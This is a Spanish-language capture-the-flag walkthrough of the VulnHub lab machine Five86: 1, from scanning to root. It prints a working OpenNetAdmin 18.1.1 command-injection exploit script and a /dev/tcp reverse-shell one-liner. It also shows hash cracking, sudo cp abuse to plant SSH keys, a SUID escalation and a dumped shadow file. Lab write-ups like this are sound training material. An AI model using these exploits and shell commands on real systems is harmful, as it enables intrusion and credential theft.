---
layout: single
title: Five86 - VulnHub
excerpt: "En esta ocasion vamos a estar realizando la maquina Five86: 1 de VulnHub en la cual vamos a estar abusando del servicio OpenNetAdmin 18.1.1 para ganar acceso al sistema como www-data de hay vamos a tener que estar migrando a otros usuarios de la maquina crackiando hashes y usando un diccionario que vamos a hacer con crunch y tambien vamos a usar el cp que podemos ejecutarlo como otro usuairo para conectarnos por ssh con la clave id_rsa.pub y para root tendremos que ejecutar un binario SUID que al final nos da una bash como root"
date: 2023-03-20
classes: wide
toc: true
toc_label: "Contenido"
toc_icon: "fire"
header:
  teaser: /assets/images/vh-writeup-five86/icon.png
  teaser_home_page: true
  icon: /assets/images/vulnhub.webp
categories:
  - VulnHub
tags:  
  - OpenNetAdmin 18.1.1
  - Custom dictionary with cruch
  - Cracking Hashes
  - Sudoers Privilege
  - SUID Binary
---

<p align="center">
<img src="/assets/images/vh-writeup-five86/icon.png">
</p>

```bash
❯ arp-scan -I ens33 --localnet --ignoredups
Interface: ens33, type: EN10MB, MAC: 00:0c:29:f1:59:4d, IPv4: 192.168.1.94
Starting arp-scan 1.9.7 with 256 hosts (https://github.com/royhills/arp-scan)
192.168.1.102	00:0c:29:dd:f5:67	VMware, Inc.
```

```bash
❯ ping -c 1 192.168.1.102
PING 192.168.1.102 (192.168.1.102) 56(84) bytes of data.
64 bytes from 192.168.1.102: icmp_seq=1 ttl=64 time=0.526 ms

--- 192.168.1.102 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 0.526/0.526/0.526/0.000 ms
❯ whichSystem.py 192.168.1.102

192.168.1.102 (ttl -> 64): Linux
```

## PortScan

```bash
❯ nmap -sCV -p22,80,10000 192.168.1.102 -oN targeted
Starting Nmap 7.93 ( https://nmap.org ) at 2023-03-20 12:26 CST
Nmap scan report for 192.168.1.102
Host is up (0.00041s latency).

PORT      STATE SERVICE VERSION
22/tcp    open  ssh     OpenSSH 7.9p1 Debian 10+deb10u1 (protocol 2.0)
| ssh-hostkey: 
|   2048 69e63cbf72f7a000f9d9f41d68e23cbd (RSA)
|   256 459ec71e9f5bd3cefc1756f2f642abdc (ECDSA)
|_  256 ae0a9e92645f8620c41144e05832e505 (ED25519)
80/tcp    open  http    Apache httpd 2.4.38 ((Debian))
| http-robots.txt: 1 disallowed entry 
|_/ona
|_http-server-header: Apache/2.4.38 (Debian)
|_http-title: Site doesn't have a title (text/html).
10000/tcp open  http    MiniServ 1.920 (Webmin httpd)
|_http-title: Site doesn't have a title (text/html; Charset=iso-8859-1).
MAC Address: 00:0C:29:DD:F5:67 (VMware)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

```bash
❯ nmap --script=http-enum -p80 192.168.1.102 -oN webScan
Starting Nmap 7.93 ( https://nmap.org ) at 2023-03-20 12:28 CST
Nmap scan report for 192.168.1.102
Host is up (0.00073s latency).

PORT   STATE SERVICE
80/tcp open  http
| http-enum: 
|   /robots.txt: Robots file
|_  /reports/: Potentially interesting folder (401 Unauthorized)
MAC Address: 00:0C:29:DD:F5:67 (VMware)

```

## Enumeracion

```ruby
❯ whatweb http://192.168.1.102
http://192.168.1.102 [200 OK] Apache[2.4.38], Country[RESERVED][ZZ], HTTPServer[Debian Linux][Apache/2.4.38 (Debian)], IP[192.168.1.102]
```

En el escaneo de `nmap` vimos que habia un `robots.txt`

```bash
❯ curl http://192.168.1.102/robots.txt
User-agent: *
Disallow: /ona
```

Esta es la web la pagina tiene un fondo negro

![](/assets/images/vh-writeup-five86/Web1.png)

Vamos a aplicar `Fuzzing` para ver otras rutas y vemos `reports` que `nmap` ya nos lo habia reportado

```bash
❯ gobuster dir -u http://192.168.1.102 -w /usr/share/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 20
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.1.102
[+] Method:                  GET
[+] Threads:                 20
[+] Wordlist:                /usr/share/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Timeout:                 10s
===============================================================
2023/03/20 12:38:06 Starting gobuster in directory enumeration mode
===============================================================
/reports              (Status: 401) [Size: 460]
/server-status        (Status: 403) [Size: 278]
                                               
===============================================================
2023/03/20 12:38:51 Finished
===============================================================
```

Es un panel de login

![](/assets/images/vh-writeup-five86/Web2.png)

La ruta `server-status` no podemos verla por que el codigo de estado es `403`

![](/assets/images/vh-writeup-five86/Web3.png)

Esta ruta si es interesante estamos autenticados como un usuario de invitado

![](/assets/images/vh-writeup-five86/Web4.png)

Esa es la version del servicio

![](/assets/images/vh-writeup-five86/Web5.png)

Aqui tienes informacion sobre como funciona y como se instala

<a href='https://github.com/opennetadmin/ona' style='color: yellow'>OpenNetAdmin</a>

<span style="color:orange">OpenNetAdmin is an IPAM (IP Address Management) tool to track your network attributes such as DNS names, IP addresses, Subnets, MAC addresses just to name a few. Through the use of plugins you can add extended it's functionality.</span>

Vamos a buscar vulnerabilidades y tenemos un `Remote Code Execution` que es un script de `Bash` nos los vamos a descargar para ver que es lo que hace

```bash
❯ searchsploit opennetadmin
---------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                |  Path
---------------------------------------------------------------------------------------------- ---------------------------------
OpenNetAdmin 13.03.01 - Remote Code Execution                                                 | php/webapps/26682.txt
OpenNetAdmin 18.1.1 - Command Injection Exploit (Metasploit)                                  | php/webapps/47772.rb
OpenNetAdmin 18.1.1 - Remote Code Execution                                                   | php/webapps/47691.sh
---------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
```

```bash
❯ searchsploit -m php/webapps/47691.sh
  Exploit: OpenNetAdmin 18.1.1 - Remote Code Execution
      URL: https://www.exploit-db.com/exploits/47691
     Path: /usr/share/exploitdb/exploits/php/webapps/47691.sh
File Type: ASCII text
```

```bash
❯ ls
 47691.sh
❯ mv 47691.sh OpenNetAdmin.sh
❯ ls
 OpenNetAdmin.sh
❯ chmod +x OpenNetAdmin.sh

```

<span style="color:orange">Esto es lo que hace tu le das un input que lo mete en la variable cmd que con una peticion por post ala url que tu le pasas al programa que es el primer argumento y le inyecta un comando y te lo interpreta</span>

```bash
❯ catn OpenNetAdmin.sh
# Exploit Title: OpenNetAdmin 18.1.1 - Remote Code Execution
# Date: 2019-11-19
# Exploit Author: mattpascoe
# Vendor Homepage: http://opennetadmin.com/
# Software Link: https://github.com/opennetadmin/ona
# Version: v18.1.1
# Tested on: Linux

# Exploit Title: OpenNetAdmin v18.1.1 RCE
# Date: 2019-11-19
# Exploit Author: mattpascoe
# Vendor Homepage: http://opennetadmin.com/
# Software Link: https://github.com/opennetadmin/ona
# Version: v18.1.1
# Tested on: Linux

#!/bin/bash

URL="${1}"
while true;do
 echo -n "$ "; read cmd
 curl --silent -d "xajax=window_submit&xajaxr=1574117726710&xajaxargs[]=tooltips&xajaxargs[]=ip%3D%3E;echo \"BEGIN\";${cmd};echo \"END\"&xajaxargs[]=ping" "${URL}" | sed -n -e '/BEGIN/,/END/ p' | tail -n +2 | head -n -1
done
```

Para verlo de forma manual vamos a usar `Burpsuite`

Vamos a modificar el `exploit` para que burpusuite intercepte la peticion ya que escucha por el equipo local en el puerto `8080`

```bash
❯ catn OpenNetAdmin.sh
# Exploit Title: OpenNetAdmin 18.1.1 - Remote Code Execution
# Date: 2019-11-19
# Exploit Author: mattpascoe
# Vendor Homepage: http://opennetadmin.com/
# Software Link: https://github.com/opennetadmin/ona
# Version: v18.1.1
# Tested on: Linux

# Exploit Title: OpenNetAdmin v18.1.1 RCE
# Date: 2019-11-19
# Exploit Author: mattpascoe
# Vendor Homepage: http://opennetadmin.com/
# Software Link: https://github.com/opennetadmin/ona
# Version: v18.1.1
# Tested on: Linux

#!/bin/bash

URL="${1}"
while true;do
 echo -n "$ "; read cmd
 curl --silent --proxy http://127.0.0.1:8080 -d "xajax=window_submit&xajaxr=1574117726710&xajaxargs[]=tooltips&xajaxargs[]=ip%3D%3E;echo \"BEGIN\";${cmd};echo \"END\"&xajaxargs[]=ping" "${URL}" | sed -n -e '/BEGIN/,/END/ p' | tail -n +2 | head -n -1
done
```

Bueno ahora vamos a interceptar la respuesta al darle al `ENTER` `Burpsuite` ya lo habra interceptado

```bash
❯ ./OpenNetAdmin.sh http://192.168.1.102/ona/
$ whoami
```

Y esta es la respuesta

![](/assets/images/vh-writeup-five86/burp1.png)

Si quitamos el `Intercept` y regresamos ala consola vemos que el comando se ejecuta

```bash
❯ ./OpenNetAdmin.sh http://192.168.1.102/ona/
$ whoami
www-data
$ 
```

Estamos en la maquina victima

```bash
$ hostname -I
192.168.1.102 2806:102e:10:ecc:20c:29ff:fedd:f567 
$ 
```

Si con `Burpsuite` modificamos el comando a `id` vemos que funciona

![](/assets/images/vh-writeup-five86/burp2.png)

Estos son los usuarios con una `Bash`

```bash
$ cat /etc/passwd | grep sh
root:x:0:0:root:/root:/bin/bash
sshd:x:105:65534::/run/sshd:/usr/sbin/nologin
moss:x:1001:1001:Maurice Moss:/home/moss:/bin/bash
roy:x:1002:1002:Roy Trenneman:/home/roy:/bin/bash
jen:x:1003:1003:Jen Barber:/home/jen:/bin/bash
richmond:x:1004:1004:Richmond Avenal:/home/richmond:/bin/bash
douglas:x:1005:1005:Douglas Reynholm:/home/douglas:/bin/bash
```

Vamos a usar `rlwrap` para poder hacer `ctrl+l` y demas 

```bash
❯ rlwrap ./OpenNetAdmin.sh http://192.168.1.102/ona/
whoami
www-data
id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
$ 
```

Vamos a enviarnos una reverse shell 

```bash
❯ rlwrap ./OpenNetAdmin.sh http://192.168.1.102/ona/
whoami
www-data
id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
bash -c "bash -i >%26 /dev/tcp/192.168.1.94/443 0>%261"
```

## Shell como www-data

Y resibimos la shell

```bash
❯ nc -nlvp 443
listening on [any] 443 ...
connect to [192.168.1.94] from (UNKNOWN) [192.168.1.102] 59352
bash: cannot set terminal process group (650): Inappropriate ioctl for device
bash: no job control in this shell
www-data@five86-1:/opt/ona/www$ 
```

Vamos a hacer un tratamiento de la `tty`

```bash
www-data@five86-1:/opt/ona/www$ script /dev/null -c bash
script /dev/null -c bash
Script started, file is /dev/null
www-data@five86-1:/opt/ona/www$ ^Z
zsh: suspended  nc -nlvp 443
```

Al escribir `reset xterm` darle al `ENTER`

```bash
❯ stty raw -echo; fg
[1]  + continued  nc -nlvp 443
                              reset xterm
```

Estos son los usuarios

```bash
www-data@five86-1:/home$ ls
douglas  jen  moss  richmond  roy
www-data@five86-1:/home$ 
```

No hay nada interesante por que somos `www-data`

```bash
www-data@five86-1:/home$ find . 2>/dev/null
.
./roy
./douglas
./richmond
./moss
./jen
www-data@five86-1:/home$ find . -ls 2>/dev/null
   262150      4 drwxr-xr-x   7 root     root         4096 Jan  1  2020 .
   295511      4 drwx------   2 roy      roy          4096 Jan  1  2020 ./roy
   295514      4 drwx------   3 douglas  douglas      4096 Jan  1  2020 ./douglas
   295513      4 drwx------   2 richmond richmond     4096 Jan  1  2020 ./richmond
   295510      4 drwx------   3 moss     moss         4096 Jan  1  2020 ./moss
   295512      4 drwx------   4 jen      jen          4096 Jan  1  2020 ./jen
www-data@five86-1:/home$ 
```

Podemos buscar por la ruta que habiamos visto de `reports` por que hay un panel de `login`

```bash
www-data@five86-1:/home$ find / -name reports 2>/dev/null
/var/www/html/reports
/opt/ona/www/workspace_plugins/builtin/reports
www-data@five86-1:/home$ 

```

Hay un contenido oculto

```bash
www-data@five86-1:/var/www/html/reports$ find .
.
./index.html
./.htaccess
www-data@five86-1:/var/www/html/reports$ 
```

```bash
www-data@five86-1:/var/www/html/reports$ cat .htaccess 
AuthType Basic
AuthName "Restricted Area"
AuthUserFile /var/www/.htpasswd
require valid-user
www-data@five86-1:/var/www/html/reports$ 

```

Y tenemos el usuario y un `hash`

```bash
www-data@five86-1:/var/www/html/reports$ cat /var/www/.htpasswd 
douglas:$apr1$9fgG/hiM$BtsL9qpNHUlylaLxk81qY1

# To make things slightly less painful (a standard dictionary will likely fail),
# use the following character set for this 10 character password: aefhrt 
www-data@five86-1:/var/www/html/reports$ 
```

`douglas:$apr1$9fgG/hiM$BtsL9qpNHUlylaLxk81qY1`

En los comentarios nos estan dando pistas

<span style="color:orange">Nos estan diciendo que si usamos un diccionario como el rockyou va demorar mucho que usameos un diccionario con 10 caracteres las posibles contraseñas teniendo en cuenta los caracteres aefhrt</span>

 Vamos a usar la herramienta `crunch`

 ```bash
❯ crunch 10 10 aefhrt > dictionary.txt
Crunch will now generate the following amount of data: 665127936 bytes
634 MB
0 GB
0 TB
0 PB
Crunch will now generate the following number of lines: 60466176 
```

```bash
❯ nvim hash
❯ catn hash
douglas:$apr1$9fgG/hiM$BtsL9qpNHUlylaLxk81qY1
```

```bash
❯ hash-identifier
   #########################################################################
   #     __  __                     __           ______    _____           #
   #    /\ \/\ \                   /\ \         /\__  _\  /\  _ `\         #
   #    \ \ \_\ \     __      ____ \ \ \___     \/_/\ \/  \ \ \/\ \        #
   #     \ \  _  \  /'__`\   / ,__\ \ \  _ `\      \ \ \   \ \ \ \ \       #
   #      \ \ \ \ \/\ \_\ \_/\__, `\ \ \ \ \ \      \_\ \__ \ \ \_\ \      #
   #       \ \_\ \_\ \___ \_\/\____/  \ \_\ \_\     /\_____\ \ \____/      #
   #        \/_/\/_/\/__/\/_/\/___/    \/_/\/_/     \/_____/  \/___/  v1.2 #
   #                                                             By Zion3R #
   #                                                    www.Blackploit.com #
   #                                                   Root@Blackploit.com #
   #########################################################################
--------------------------------------------------
 HASH: $apr1$9fgG/hiM$BtsL9qpNHUlylaLxk81qY1

Possible Hashs:
[+] MD5(APR)
--------------------------------------------------
```

Vamos a hacer mejor y mas pequeño el diccionario

```bash
❯ wc -l dictionary.txt
60466176 dictionary.txt
```

```bash
❯ cat dictionary.txt | awk '/a/&&/e/&&/f/&&/h/&&/r/&&/t/' > small.txt
❯ wc -l small.txt
16435440 small.txt
```

Vamos a usar `john`

```bash
❯ john --wordlist=small.txt hash
Warning: detected hash type "md5crypt", but the string is also recognized as "md5crypt-long"
Use the "--format=md5crypt-long" option to force loading these as that type instead
Using default input encoding: UTF-8
Loaded 1 password hash (md5crypt, crypt(3) $1$ (and variants) [MD5 512/512 AVX512BW 16x3])
Will run 2 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
fatherrrrr       (douglas)
1g 0:00:01:04 DONE (2023-03-20 13:47) 0.01558g/s 92253p/s 92253c/s 92253C/s fatherraff..fatherttae
Use the "--show" option to display all of the cracked passwords reliably
Session completed

```

`douglas:fatherrrrr`

Vamos a autenticarnos en el panel de `login` que vimos

![](/assets/images/vh-writeup-five86/Web6.png)

Y bueno pues no hay nada asi que vamos a migrar al usuario

## Shell como douglas

```bash
www-data@five86-1:/var/www/html/reports$ su douglas
Password: 
douglas@five86-1:/var/www/html/reports$ whoami
douglas
douglas@five86-1:/var/www/html/reports$ id
uid=1005(douglas) gid=1005(douglas) groups=1005(douglas)
douglas@five86-1:/var/www/html/reports$ 
```

Podemos ejecutar el comando `cp` como el usuario `jen` sin proporcionar contraseña

```bash
douglas@five86-1:~$ sudo -l
Matching Defaults entries for douglas on five86-1:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User douglas may run the following commands on five86-1:
    (jen) NOPASSWD: /bin/cp
douglas@five86-1:~$ 


```

No tiene `id_rsa`

```bash
douglas@five86-1:~$ sudo -u jen cp /home/jen/.ssh/id_rsa /tmp/id_rsa
cp: cannot stat '/home/jen/.ssh/id_rsa': No such file or directory
douglas@five86-1:~$ 
```

Como `douglas` tiene una `id_rsa` podemos copear la `id_rsa.pub` que es la clave publica al directorio de `jen` como `authorized_keys`

```bash
douglas@five86-1:~$ cd .ssh/
douglas@five86-1:~/.ssh$ cp id_rsa.pub /tmp/
douglas@five86-1:~/.ssh$ sudo -u jen cp /tmp/id_rsa.pub /home/jen/.ssh/authorized_keys
douglas@five86-1:~/.ssh$ 
```

## Shell como jen

```bash
douglas@five86-1:~/.ssh$ ssh jen@localhost
The authenticity of host 'localhost (::1)' can't be established.
ECDSA key fingerprint is SHA256:aE9ZqWXrvGgzgM21BjQ23GmxQVBeD5CZw0nUq8P8RyM.
Are you sure you want to continue connecting (yes/no)? yes
Warning: Permanently added 'localhost' (ECDSA) to the list of known hosts.
Linux five86-1 4.19.0-6-amd64 #1 SMP Debian 4.19.67-2+deb10u2 (2019-11-11) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
You have new mail.
jen@five86-1:~$ whoami
jen
jen@five86-1:~$ 
```

Nos quedan esos usuarios asta ahora tenemos acceso como `douglas` y `jen`

```bash
jen@five86-1:/home$ ls -l
total 20
drwx------ 3 douglas  douglas  4096 Jan  1  2020 douglas
drwx------ 4 jen      jen      4096 Jan  1  2020 jen
drwx------ 3 moss     moss     4096 Jan  1  2020 moss
drwx------ 2 richmond richmond 4096 Jan  1  2020 richmond
drwx------ 2 roy      roy      4096 Jan  1  2020 roy
jen@five86-1:/home$ 
```

Somos propietarios de esos archivos

```bash
jen@five86-1:/$ find / -user jen -ls 2>/dev/null | grep -vE "sys|proc"
    46493      0 drwx------   3 jen      jen            60 Mar 20 16:05 /run/user/1003
     6706      4 -rw-rw----   1 jen      mail          885 Jan  1  2020 /var/mail/jen
        4      0 crw--w----   1 jen      tty      136,   1 Mar 20 16:08 /dev/pts/1
   295512      4 drwx------   4 jen      jen          4096 Jan  1  2020 /home/jen
   295528      4 drwx------   2 jen      jen          4096 Mar 20 16:04 /home/jen/.ssh
   266506      4 -rw-r--r--   1 jen      jen           398 Mar 20 16:04 /home/jen/.ssh/authorized_keys
   295529      4 drwxr-xr-x   2 jen      jen          4096 Jan  1  2020 /home/jen/reports
   266536     12 -rwxr-xr-x   1 jen      jen          9223 Jan  1  2020 /home/jen/reports/Audit.txt
   266525      4 -rwxr-xr-x   1 jen      jen             6 Jan  1  2020 /home/jen/reports/IT_Budget.txt
   262389      0 lrwxrwxrwx   1 jen      jen             9 Jan  1  2020 /home/jen/.bash_history -> /dev/null
jen@five86-1:/$ 

```

Hay un correo

```bash
jen@five86-1:/$ cat /var/mail/jen
From roy@five86-1 Wed Jan 01 03:17:00 2020
Return-path: <roy@five86-1>
Envelope-to: jen@five86-1
Delivery-date: Wed, 01 Jan 2020 03:17:00 -0500
Received: from roy by five86-1 with local (Exim 4.92)
	(envelope-from <roy@five86-1>)
	id 1imZBc-0001FU-El
	for jen@five86-1; Wed, 01 Jan 2020 03:17:00 -0500
To: jen@five86-1
Subject: Monday Moss
MIME-Version: 1.0
Content-Type: text/plain; charset="UTF-8"
Content-Transfer-Encoding: 8bit
Message-Id: <E1imZBc-0001FU-El@five86-1>
From: Roy Trenneman <roy@five86-1>
Date: Wed, 01 Jan 2020 03:17:00 -0500

Hi Jen,

As you know, I'll be on the "customer service" course on Monday due to that incident on Level 4 with the accounts people.

But anyway, I had to change Moss's password earlier today, so when Moss is back on Monday morning, can you let him know that his password is now Fire!Fire!

Moss will understand (ha ha ha ha).

Tanks,
Roy

jen@five86-1:/$ 
```

Y nada nos estan dando la contraseña de `Moss` XDD 

`Moss:Fire!Fire!`

## Shell como moss

```bash
jen@five86-1:/$ su moss
Password: 
moss@five86-1:/$ whoami
moss
moss@five86-1:/$ id
uid=1001(moss) gid=1001(moss) groups=1001(moss)
moss@five86-1:/$ 
```

No tenemos ningun privilegio a nivel de sudoers

```bash
moss@five86-1:/$ sudo -l
[sudo] password for moss: 
Sorry, user moss may not run sudo on five86-1.
moss@five86-1:/$ 
```

Hay un directorio que se llama `games` 

```bash
moss@five86-1:~$ find . 2>/dev/null
.
./.games
./.games/snake
./.games/upyourgame
./.games/bcd
./.games/battlestar
./.games/sudoku
./.games/bombardier
./.games/ninvaders
./.games/worms
./.games/hunt
./.games/empire
./.games/nsnake
./.games/freesweep
./.games/petris
./.games/pacman4console
./.bash_history
moss@five86-1:~$ ls -la
total 12
drwx------ 3 moss moss 4096 Jan  1  2020 .
drwxr-xr-x 7 root root 4096 Jan  1  2020 ..
lrwxrwxrwx 1 moss moss    9 Jan  1  2020 .bash_history -> /dev/null
drwx------ 2 moss moss 4096 Jan  1  2020 .games
moss@five86-1:~$ 
```

Hay un binario `upyourgame`

```bash
moss@five86-1:~/.games$ ls -l
total 20
lrwxrwxrwx 1 moss moss    21 Jan  1  2020 battlestar -> /usr/games/battlestar
lrwxrwxrwx 1 moss moss    14 Jan  1  2020 bcd -> /usr/games/bcd
lrwxrwxrwx 1 moss moss    21 Jan  1  2020 bombardier -> /usr/games/bombardier
lrwxrwxrwx 1 moss moss    17 Jan  1  2020 empire -> /usr/games/empire
lrwxrwxrwx 1 moss moss    20 Jan  1  2020 freesweep -> /usr/games/freesweep
lrwxrwxrwx 1 moss moss    15 Jan  1  2020 hunt -> /usr/games/hunt
lrwxrwxrwx 1 moss moss    20 Jan  1  2020 ninvaders -> /usr/games/ninvaders
lrwxrwxrwx 1 moss moss    17 Jan  1  2020 nsnake -> /usr/games/nsnake
lrwxrwxrwx 1 moss moss    25 Jan  1  2020 pacman4console -> /usr/games/pacman4console
lrwxrwxrwx 1 moss moss    17 Jan  1  2020 petris -> /usr/games/petris
lrwxrwxrwx 1 moss moss    16 Jan  1  2020 snake -> /usr/games/snake
lrwxrwxrwx 1 moss moss    17 Jan  1  2020 sudoku -> /usr/games/sudoku
-rwsr-xr-x 1 root root 16824 Jan  1  2020 upyourgame
lrwxrwxrwx 1 moss moss    16 Jan  1  2020 worms -> /usr/games/worms
moss@five86-1:~/.games$ 

```

## Shell como root

XDD

```bash
moss@five86-1:~/.games$ ./upyourgame 
Would you like to play a game? yes

Could you please repeat that? yes

Nope, you'll need to enter that again. yes

You entered: No.  Is this correct? no

We appear to have a problem?  Do we have a problem? yes

Made in Britain.
# bash
root@five86-1:~/.games# whoami
root
root@five86-1:~/.games# cd /root
root@five86-1:/root# ls
flag.txt
root@five86-1:/root# cat flag.txt 
8f3b38dd95eccf600593da4522251746
root@five86-1:/root# 
```

Si quisieras saber las contraseñas de los que faltaron pues como estas como root puedes crackearlas por que puedes el `etc/shadow`

```bash
root@five86-1:/etc# cat shadow
root:$6$GEXLROFsH4hFOtgc$2yAqzTpsmPu8FsfKNi2VZp4K5bA/mWS2hZetUFpuEHetgzz6GsyEcLbuDbWdroHPaC.AwSGBFTYZz0LQjj0Of.:18262:0:99999:7:::
daemon:*:18261:0:99999:7:::
bin:*:18261:0:99999:7:::
sys:*:18261:0:99999:7:::
sync:*:18261:0:99999:7:::
games:*:18261:0:99999:7:::
man:*:18261:0:99999:7:::
lp:*:18261:0:99999:7:::
mail:*:18261:0:99999:7:::
news:*:18261:0:99999:7:::
uucp:*:18261:0:99999:7:::
proxy:*:18261:0:99999:7:::
www-data:*:18261:0:99999:7:::
backup:*:18261:0:99999:7:::
list:*:18261:0:99999:7:::
irc:*:18261:0:99999:7:::
gnats:*:18261:0:99999:7:::
nobody:*:18261:0:99999:7:::
_apt:*:18261:0:99999:7:::
systemd-timesync:*:18261:0:99999:7:::
systemd-network:*:18261:0:99999:7:::
systemd-resolve:*:18261:0:99999:7:::
messagebus:*:18261:0:99999:7:::
sshd:*:18261:0:99999:7:::
systemd-coredump:!!:18261::::::
mysql:!:18261:0:99999:7:::
moss:$6$ZKX2L7fJTvFO2Ved$qrJBD8SErjEjIeT.KIqmvgENAnjTQH6mCyQMLey7aMn31uiD0szjhrq8EL6gnJkK5sHzxHEHGyJqbiwI6iUHx0:18262:0:99999:7:::
roy:$6$Uh0q/F52PTqJQrvA$VDzEEwsd.6PiGP44dBVDbMj10IjIrCdB0qg.e36A0cW24jSVtB3PcD6YokG57hZxLs89Fx0NvWlN63.uMaac./:18261:0:99999:7:::
jen:$6$oUJMVFRFI4qds92b$FIP4hsXcnEa2sHT/NyVnxi/PeMc9Kc5r7Sd/dNGyWW.7OS6nz6OinTyPAaQf5h6oxYDNz/7Cex0Gyo5EJ9OPo0:18261:0:99999:7:::
richmond:$6$9ezwkGRwZkwCcNVu$xSeVVsn7c6jN3DwygvTqS7BT1QNjFemNVEwb6pZNCu3V2IvjUcMULhxgZ67Y/KfVSpfvoWi5Q/6fTMP9nRLty1:18261:0:99999:7:::
douglas:$6$XyRmT1iTa7FHKynm$qYVWeN85.Yaj7IpMrt0flV221BCj5WhZeCBsqryZo/DgoP/GEyekTZ6s.Q.N3lJfaiwnT5SxlWxm6m59Lg4d91:18263:0:99999:7:::
Debian-exim:!:18262:0:99999:7:::
root@five86-1:/etc# 
```

## Analizando Binario

Vamos a enviar el Binario a nuestra maquina de atacante

```bash
moss@five86-1:~/.games$ cat < upyourgame > /dev/tcp/192.168.1.94/443
moss@five86-1:~/.games$ 
```

```bash
❯ nc -nlvp 443 > upyourgame
listening on [any] 443 ...
connect to [192.168.1.94] from (UNKNOWN) [192.168.1.102] 59358
```

```bash
❯ file upyourgame
upyourgame: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=391189d61024b35dd29857e0c206c7b93023129e, not stripped
```

Vamos a usar `ghidra`

```bash
❯ ghidra > /dev/null 2>&1 & disown
[1] 92865
```

No esta aplicando comparativas de nada solo que cuando llega al final cambia tu `uid` a 0 para que te lanse el comando `bin/sh` para que te de una bash como root por que el binario es `SUID`

![](/assets/images/vh-writeup-five86/binary.png)
